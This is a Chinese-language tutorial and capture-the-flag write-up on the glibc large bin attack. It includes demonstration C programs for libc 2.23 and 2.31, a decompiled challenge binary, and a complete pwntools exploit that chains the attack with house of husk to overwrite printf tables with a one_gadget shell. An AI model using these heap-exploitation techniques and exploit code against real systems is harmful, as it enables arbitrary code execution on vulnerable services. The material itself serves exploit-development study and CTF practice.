# large bin attack

## 前言

house系列的很多手法都需要利用large bin attack，这里来系统总结一下，以便于后续house系列的学习。

## large bin

large bin的结构相对来说比较复杂

    
    
    /*
      This struct declaration is misleading (but accurate and necessary).
      It declares a "view" into memory allowing access to necessary
      fields at known offsets from a given base. See explanation below.
    */
    struct malloc_chunk {
      INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
      INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */
      struct malloc_chunk* fd;         /* double links -- used only if free. */
      struct malloc_chunk* bk;
      /* Only used for large blocks: pointer to next larger size.  */
      struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
      struct malloc_chunk* bk_nextsize;
    };
    

比一般的bin中的chunk多了fd_nextsize和bk_nextsize结构

![](./img/813699219694280259.png)

Largebin用来收容超过0x400大小以上的chunk(64位)，其是一个双向链表，一共可以容纳63个chunk，对于链表对应存储chunk的大小没有明确规定，而是规定了一个范围，根据具体的数值可以分为6组

组-------数量--------差值  
1---------32---------64(0x40)  
2---------16---------512(0x200)  
3---------8----------4096(0x1000)  
4---------4----------32768(0x8000)  
5---------2----------262144(0x40000)  
6---------1----------无限制

![](./img/718783758634190976.png)

用 fd_nextsize 和 bk_nextsize 链接的链表为横向链表，用 fd 和 bk 链接的链表为纵向链表  
在横向链表中，堆管理器维护一个循环的单调链表，由最大的 size（在这个 index 下的最大 size）作为表头，最小的 size 作为表尾，且首尾相连  
size 最大的chunk的 bk_nextsize 指向最小的 chunk，size 最小的 chunk 的 fd_nextsize 指向最大的
chunk  
一般空闲的large chunk在fd的遍历顺序中，按照由大到小的顺序排列

## 插入顺序

    
    
    if (in_smallbin_range(size)) 
    {
      victim_index = smallbin_index(size);
      bck = bin_at(av, victim_index);
      fwd = bck->fd;
    }
    else 
    {
    
      victim_index = largebin_index(size);
      bck = bin_at(av, victim_index); 
      fwd = bck->fd; 
    
      if (fwd != bck) {
    
          size |= PREV_INUSE;
          assert((bck->bk->size & NON_MAIN_ARENA) == 0);
    
          if ((unsigned long) (size) < (unsigned long) (bck->bk->size)) {
    
              fwd = bck;
              bck = bck->bk; 
    
              victim->fd_nextsize = fwd->fd; 
    
              victim->bk_nextsize = fwd->fd->bk_nextsize; 
    
              fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
    
          } 
          else 
          {
              assert((fwd->size & NON_MAIN_ARENA) == 0);
    
              while ((unsigned long) size < fwd->size) {
                  fwd = fwd->fd_nextsize;
                  assert((fwd->size & NON_MAIN_ARENA) == 0);
              }
    
              if ((unsigned long) size == (unsigned long) fwd->size)
                  fwd = fwd->fd; 
              else 
              {
                  victim->fd_nextsize = fwd;
                  victim->bk_nextsize = fwd->bk_nextsize;
                  fwd->bk_nextsize = victim;
                  victim->bk_nextsize->fd_nextsize = victim;
              }
              bck = fwd->bk;
          }
      } 
      else 
        victim->fd_nextsize = victim->bk_nextsize = victim;
    
    }
    mark_bin(av, victim_index);
    victim->bk = bck;
    victim->fd = fwd;
    fwd->bk = victim;
    bck->fd = victim;
    

1.按照大小，从大到小排序（小的链接large bin块）  
2.如果大小相同，按照free的时间排序  
3.多个大小相同的堆块，只有首堆块的fd_nextsize和bk_nextsize会指向其他堆块，后面的堆块的fd_nextsize和bk_nextsize均为0  
4.size最大的chunk的bk_nextsize指向最小的chunk，size最小的chunk的fd_nextsize指向最大的chunk

## libc-2.23

### 演示实例

利用 large bin attack 向两个栈地址中写入堆地址

    
    
    #include<stdio.h>
    #include<stdlib.h>
    #include<assert.h>
    
    int main()
    {
    
        unsigned long stack_var1 = 0;
        unsigned long stack_var2 = 0;
    
        fprintf(stderr, "stack_var1 (%p): %ld\n", &stack_var1, stack_var1);
        fprintf(stderr, "stack_var2 (%p): %ld\n\n", &stack_var2, stack_var2);
    
        unsigned long *p1 = malloc(0x320);
        malloc(0x20);
        unsigned long *p2 = malloc(0x400);
        malloc(0x20);
        unsigned long *p3 = malloc(0x400);
        malloc(0x20);
    
        free(p1);
        free(p2);
        malloc(0x90);
    
        free(p3);
    
        p2[-1] = 0x3f1;
        p2[0] = 0;
        p2[2] = 0;
        p2[1] = (unsigned long)(&stack_var1 - 2);
        p2[3] = (unsigned long)(&stack_var2 - 4);
    
        malloc(0x90);
    
        fprintf(stderr, "stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
        fprintf(stderr, "stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);
    
        return 0;
    }
    

用gdb跟着流程分析一下

    
    
    fprintf(stderr, "stack_var1 (%p): %ld\n", &stack_var1, stack_var1);
        fprintf(stderr, "stack_var2 (%p): %ld\n\n", &stack_var2, stack_var2);
    
    
    
    stack_var1 (0x7fffffffdc90): 0
    stack_var2 (0x7fffffffdc98): 0
    
    
    
    unsigned long *p1 = malloc(0x320);
        malloc(0x20); //protect
        unsigned long *p2 = malloc(0x400);
        malloc(0x20); //protect
        unsigned long *p3 = malloc(0x400);
        malloc(0x20); //protect
    

![](./img/1747942884869062511.png)

    
    
    free(p1);
        free(p2);
    

![](./img/6161114072444515428.png)

    
    
    malloc(0x90);
    

这里是去遍历unsorted bin，发现没有大小一致的chunk后，就把两个chunk释放到大小对应的链表中，也就是p1进入small
bin，p2进入large bin，然后分割small bin中的p1，申请完后剩下的部分再放回unsorted bin

![](./img/6852358573686368941.png)

    
    
    free(p3);
    

![](./img/1285027267554090682.png)  
然后修改p2的结构

fd : 0  
bk : stack_var1_addr - 0x10  
fd_nextsize : 0  
bk_nextsize : stack_var2_addr - 0x20

    
    
    p2[-1] = 0x3f1;
        p2[0] = 0;
        p2[2] = 0;
        p2[1] = (unsigned long)(&stack_var1 - 2);
        p2[3] = (unsigned long)(&stack_var2 - 4);
    

修改前：

![](./img/4117423321927688609.png)  
修改后：  
重点注意 bk 和 bk_nextsize

![](./img/143053448887625114.png)  
此时还未链入large bin的p3

![](./img/8303720902138506384.png)

    
    
    malloc(0x90);
    

攻击后的p2：

![](./img/3404530583163081863.png)

攻击后的p3：

![](./img/7262434376227427537.png)

    
    
    stack_var1 (0x7fffffffdc90): 0x6027a0
    stack_var2 (0x7fffffffdc98): 0x6027a0
    

![](./img/3871008722917483842.png)  
然后这里再详细的将一下把p3链入large bin发生的事情  
上述改变p2的size为0x3f1，这时候就满足了p2_size<p3_size  
这时候就会执行源码中的下列流程：

    
    
    fwd = bck /* fwd初始化为原链表头 */
    fwd = fwd->fd_nextsize /* 遍历链表寻找合适的fwd,最后找到fwd=p2(p2已经被伪造) */
    /* fwd = p2 */
    
    bck = fwd->bk /* 这里的fwd就是p2,而fwd->bk则是"stack_var1-2" */
    /* bck = stack_var1-2 */
    
    /* victim ：p3 */
    victim->bk = bck /* bk = stack_var1 - 2 */
    victim->fd = fwd /* fd = p2 */
    victim->bk_nextsize = fwd->bk_nextsize /* bk_nextsize = stack_var2 - 4 */
    victim->fd_nextsize = fwd /* fd_nextsize = p2 */
    

通俗一点就是  
p3 的 fd 指向 p2  
p3 的 fd_nextsize 也指向 p2  
p3 的 bk 指向 p2 bk 指向的地址  
p3 的 bk_nextsize 指向 p2 bk_nextsize 指向的地址

最后就是 stack_var1 和 stack_var2 被修改的原因：

    
    
    /* fwd = p2 */
    /* bck = stack_var1-2 */
    
    fwd->bk_nextsize = victim /* p2->bk_nextsize = p3 */
    victim->bk_nextsize->fd_nextsize = victim /* (stack_var2-4) -> fd_nextsize = p3 */
    /* stack_var2 -> victim */
    
    fwd->bk = victim /* p2->bk = p3 */
    bck->fd = victim /* (stack_var1-2) -> fd = p3 */
    /* stack_var1 -> victim */
    

通俗一点就是  
p2 的 fd 指向 p3  
p2 的 bk_nextsize 指向 p3  
stack_var1 指向 p3  
stack_var2 指向 p3

### 总结过程

在同一 large bin 范围中 ，改 size 较小的 chunkA bk为 目标地值1-0x10 , bk_nextsize 为
目标地址2-0x20，然后将size 较大的chunkB 链入 large bin，就能使得chunkB 的 fd 和 fd_nextsize
指向chunkA ,bk指向目标地值1-0x10，bk_nextsize指向目标地址2-0x20
，同时在得两个目标地址处写上较大chunk的地址(主要目的)

## libc-2.31

glibc-2.31 对于 largebin 的检查做了一些增强

    
    
    if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd)) malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
    if (bck->fd != fwd) malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");
    

不过这个检查只存在于插入 large bin 的 unsorted chunk 的 size 大于 large bin 中本身有的 chunk 时
(就是unsorted bin 中的 chunk 链入large bin 时与原有的 large bin 中的chunk大小进行比较 )  
我们在libc-2.23中对 large bin attack 的利用是 大的chunk链入large bin
，这里为了绕过检查，我们可以链入小的chunk，同时修改size比较大的chunk达到攻击效果(不过只能改bk_nextsize，然后能够向一个目标地址写入较大chunk的地址)

### 演示实例

    
    
    #include<stdio.h>
    #include<malloc.h>
    int main(){
      setvbuf(stdout, 0, 2, 0);
      setvbuf(stdin, 0, 2, 0);
      puts("glibc-2.31 large bin attack");
      char array[0x20];
      size_t *p1 = malloc(0x460); //largebin
      malloc(0x10); //to separate
      size_t *p2 = malloc(0x450); //unsortedbin
      malloc(0x450); //to separate
      free(p1);
      malloc(0x470); //Release p1 into largebin
      free(p2);  //Release p2 into unsortedbin
      *(p1+3) = array-0x20;
      malloc(0x470); //Release p2 into largebin
    }
    
    
    
    free(p2) 后
    

![](./img/6904558560639161690.png)  
然后更改size较大chunk的

![](./img/509549811352082204.png)

    
    
    malloc(0x470);
    

修改p1 的 bk_nextsize

![](./img/1541173832327189964.png)

    
    
    malloc(0x470);
    

array成功被修改成p2地址

![](./img/563889093884839314.png)

### 总结过程

攻击也是发生在插入过程中，只不过这次是size较小的插入，同样修改的还是预先留在large bin中的chunk(这次是size 较大)的
bk_nextsize ，最终往目标地址处写入了插入chunk的地址

## heap_level1

glibc 2.31

### ida

    
    
    int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
    {
      int i; // [rsp+8h] [rbp-8h]
      int v4; // [rsp+Ch] [rbp-4h]
    
      ready(argc, argv, envp);
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            menu_book();
            v4 = my_read();
            if ( v4 != 4 )
              break;
            edit_book();
          }
          if ( v4 <= 4 )
            break;
    LABEL_13:
          for ( i = 0; i <= 0; ++i )
            printf("%X", &puts);  //可以打house of husk
        }
        if ( v4 == 3 )
        {
          show_book();
        }
        else
        {
          if ( v4 > 3 )
            goto LABEL_13;
          if ( v4 == 1 )
          {
            add_book();
          }
          else
          {
            if ( v4 != 2 )
              goto LABEL_13;
            delete_book();
          }
        }
      }
    }
    
    
    
    int add_book()
    {
      unsigned int size; // [rsp+8h] [rbp-38h]
      unsigned int size_4; // [rsp+Ch] [rbp-34h]
      void *v3; // [rsp+10h] [rbp-30h]
      char buf[4]; // [rsp+1Ch] [rbp-24h] BYREF
      char nptr[24]; // [rsp+20h] [rbp-20h] BYREF
      unsigned __int64 v6; // [rsp+38h] [rbp-8h]
    
      v6 = __readfsqword(0x28u);
      puts("HOw much?");
      read(0, buf, 5uLL);
      size = atoi(buf);
      if ( size > 0x550 || size <= 0x41F )   //      0x420 <= size <= 0x550
      {
        puts("size error!");
        exit(0);
      }
      v3 = malloc(size);
      puts("which?");
      read(0, nptr, 8uLL);
      size_4 = atoi(nptr);
      book_size[size_4] = size;
      *((_QWORD *)&book_ptr + size_4) = v3;
      puts("Content:");
      read(0, *((void **)&book_ptr + size_4), size);
      return puts("book add OK!");
    }
    
    
    
    int delete_book()
    {
      unsigned int v1; // [rsp+Ch] [rbp-14h]
      char buf[5]; // [rsp+13h] [rbp-Dh] BYREF
      unsigned __int64 v3; // [rsp+18h] [rbp-8h]
    
      v3 = __readfsqword(0x28u);
      puts("which one?");
      read(0, buf, 5uLL);
      v1 = atoi(buf);
      if ( v1 <= 0x20 && *((_QWORD *)&book_ptr + v1) )   //限制了堆块的数量为0x20
        free(*((void **)&book_ptr + v1));
      else
        puts("Invalid idx");
      return puts("delete OK!");
    }
    
    
    
    int edit_book()
    {
      unsigned int v1; // [rsp+Ch] [rbp-24h]
      char buf[24]; // [rsp+10h] [rbp-20h] BYREF
      unsigned __int64 v3; // [rsp+28h] [rbp-8h]
    
      v3 = __readfsqword(0x28u);
      puts("which one?");
      read(0, buf, 0x10uLL);
      v1 = atoi(buf);
      if ( v1 > 0xF )
        return 0;
      if ( !*((_QWORD *)&book_ptr + v1) )
        return puts("empty!");
      puts("content:");
      read(0, *((void **)&book_ptr + v1), (unsigned int)book_size[v1]);
      return puts("edit OK!");
    }
    
    
    
    int show_book()
    {
      unsigned int v1; // [rsp+Ch] [rbp-24h]
      char buf[24]; // [rsp+10h] [rbp-20h] BYREF
      unsigned __int64 v3; // [rsp+28h] [rbp-8h]
    
      v3 = __readfsqword(0x28u);
      puts("which one?");
      read(0, buf, 0x10uLL);
      v1 = atoi(buf);
      if ( v1 > 0x20 )
        return 0;
      if ( !*((_QWORD *)&book_ptr + v1) )
        return puts("it is empty!");
      write(1, *((const void **)&book_ptr + v1), 8uLL);
      return puts("show OK!");
    }
    

只能申请 0x420 ~ 0x550之间的堆块，但是数量为 0x20 ，所以操作性还是很大的

### 思路

这里运用 large bin attack + house of husk 的手法来做这个题

### 详细流程

    
    
    add(0,0x500,'aaaa') #290
    add(1,0x500,'aaaa') #7a0
    
    delete(0)
    show(0)
    
    libc_base=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x1ecbe0
    leak('libc_base ',libc_base)
    

首先是在unsorted bin里面把libc基地址泄露出来

![](./img/1428742899921264281.png)

    
    
    delete(1)
    

这一步挺巧妙的，主动把chunk合并来清空bin列表

![](./img/3508207532066197304.png)

    
    
    add(2,0x420,'bbbb')
    add(3,0x420,'bbbb')
    add(4,0x420,'bbbb')
    
    edit(0,'\x00'*0x420+p64(0)+p64(0x41))
    edit(1,'\x00'*0x340+p64(0)+p64(0x41))
    
    delete(3)
    delete(4)
    
    show(4)
    heap_addr=u64(p.recv(6)[-6:].ljust(8,'\x00'))-0x6d0
    leak('heap_addr',heap_addr)
    

这里是用chunk0和chunk1存留的指针溢出(这里是人为构造的：chunk0和1 0x500 大于 chunk 2和3
0x420)，来修改chunk3和chunk4的大小，从而把3、4链入tcachebins，用这种方法来泄露heap地址。其实因为能够控制的堆块很多，所以不局限于这一种方法来泄露，只要能把chunk链起来都能泄露heap地址，不过后续为了打large
bin attack，可能还要清空bin链表，所以步骤会很多。而这种方法把chunk链入tcachebins去泄露，后续进行攻击也不需要清空bin列表

![](./img/5193527033980803509.png)

    
    
    add(5,0x448,'cccc')
    add(6,0x500,'cccc')
    add(7,0x458,'cccc')
    add(8,0x500,'cccc')
    
    delete(7)
    add(9,0x500,'dddd')
    delete(5)
    
    printf_function_table=libc_base+0x1f1318
    pl=p64(0)*3+p64(printf_function_table-0x20)
    edit(7,pl)
    
    add(10,0x500,'dddd')
    

然后就利用large bin attack去打house of husk，这里先去让 printf_function_table 非空  
可以看到修改完 bk_nextsize 后 再链入较小的 chunk ，成功往 printf_function_table 处写入chunk地址

![](./img/2885897416292448788.png)

    
    
    add(11,0x448,'eeee')
    delete(11)
    
    printf_arginfo_table=libc_base+0x1ed7b0
    
    pl=p64(0)*3+p64(printf_arginfo_table-0x20)
    edit(7,pl)
    
    add(12,0x500,'eeee')
    

把小的chunk申请出来，然后再打一遍 large bin attack 去修改 printf_arginfo_table  
可以看到 printf_arginfo_table 的首地址也成功修改成chunk头

![](./img/1692360925448152936.png)

    
    
    ogs=[0xe3afe,0xe3b01,0xe3b04]
    og=libc_base + ogs[1]
    
    pl='a'*((ord('X')*8-0x10))+p64(og)
    edit(11,pl)
    

之后就是把 __printf_arginfo_table[ord(X)] 的位置修改成 onegadget 就行了，这里 (ord('X')*8-0x10
是因为 edit 是从 fd 开始修改堆块的

    
    
    sla('>> ','666')
    

然后我们选择其他一个选项去调用printf就可以了

![](./img/7323844778278704552.png)

### exp

    
    
    #encoding = utf-8
    from pwn import *
    from pwnlib.rop import *
    from pwnlib.context import *
    from pwnlib.fmtstr import *
    from pwnlib.util.packing import *
    from pwnlib.gdb import *
    from ctypes import *
    import os
    import sys
    import time
    import base64
    
    context.os = 'linux'
    context.arch = 'amd64'
    context.log_level = "debug"
    
    name = './pwn'
    
    debug = 0
    if debug:
        p = remote('127.0.0.1',8000)
    else:
        p = process(name)
    
    
    #libcso = '/lib/x86_64-linux-gnu/libc-2.31.so'
    libcso = './libc-2.31.so'
    libc = ELF(libcso)
    #libc = elf.libc
    elf = ELF(name)
    
    
    s       = lambda data               :p.send(data)
    sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
    sl      = lambda data               :p.sendline(data)
    sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
    r       = lambda num                :p.recv(num)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    itr     = lambda                    :p.interactive()
    uu32    = lambda data,num           :u32(p.recvuntil(data)[-num:].ljust(4,b'\x00'))
    uu64    = lambda data,num           :u64(p.recvuntil(data)[-num:].ljust(8,b'\x00'))
    leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
    l64     = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
    l32     = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
    context.terminal = ['gnome-terminal','-x','sh','-c']
    
    add_idx = 1
    delete_idx = 2
    show_idx = 3
    edit_idx = 4
    
    def duan():
       gdb.attach(proc.pidof(p)[0])
       pause()
    
    bss = elf.bss()
    li('bss = '+hex(bss))
    
    
    def choice(cho):
        sla('>> ',cho)
    
    def add(size,idx,con):
        choice(add_idx)
        sla('HOw much?\n',size)
        sla('which?\n',idx)
        p.sendlineafter('Content:\n',con)
    
    def delete(idx):
        choice(delete_idx)
        sla('which one?\n',idx)
    
    def show(idx):
        choice(show_idx)
        sla('which one?\n',idx)
    
    def edit(idx,con):
        choice(edit_idx)
        sla('which one?\n',idx)
        p.sendafter('content:\n',con)
    
    
    
    add(0x500,0,b'aaa')
    add(0x500,1,b'bbb')
    
    delete(0)
    show(0)
    libc_base=l64()-96-0x10-libc.sym['__malloc_hook']
    li('libc_base = '+hex(libc_base))
    
    
    delete(1)
    duan()
    add(0x420,2,b'ccc')
    add(0x420,3,b'ddd')
    add(0x420,4,b'eee')
    
    edit(0,b'\x00'*0x420+p64(0)+p64(0x41)) #6c0
    
    edit(1,b'\x00'*0x340+p64(0)+p64(0x41)) #af0
    
    delete(3)
    delete(4)
    
    
    show(4)
    heap_addr = u64(p.recvuntil("\x55")[-6:].ljust(8,b"\x00"))-0x6d0 #+0x290
    li('heap_addr = '+hex(heap_addr))
    
    add(0x448,5, b'fff') #
    add(0x500,6, b'ggg')
    add(0x458,7, b'hhh') #
    add(0x500,8, b'iii')
    
    
    delete(7) #ub
    add(0x500,9,b'jjj') #chunk7 -> large
    
    
    ###__printf_function_table != 0
    delete(5) #ub
    
    
    printf_function_table = libc_base+0x1f1318
    pl=p64(libc_base+0x1ecfe0)+p64(libc_base+0x1ecfe0)+p64(heap_addr+0x1350)+p64(printf_function_table-0x20)
    # main_arena+1120  main_arena+1120
    # chunk7-0x20      __printf_function_table-0x20
    edit(7,pl)
    
    #duan()
    add(0x500,10,'kkk') #attack
    
    #duan()
    
    ###__printf_arginfo_table 
    add(0x448,11,'lll') #rl chunk5
    delete(11) #ub
    duan()
    printf_arginfo_table = libc_base+0x1ed7b0
    pl=p64(libc_base+0x1ecfe0)+p64(libc_base+0x1ecfe0)+p64(heap_addr+0x1350)+p64(printf_arginfo_table-0x20)
    edit(7,pl)
    
    add(0x500,12,'mmm') #attack
    
    ogs = [0xe3afe,0xe3b01,0xe3b04]
    og = libc_base + ogs[1]
    
    pl=b'a'*((ord('X'))*8-0x10)+p64(og)
    #printf(ord('X')-2)
    edit(11,pl)
    
    #duan()
    sla('>> ','5')
    '''
    '''
    itr()
    

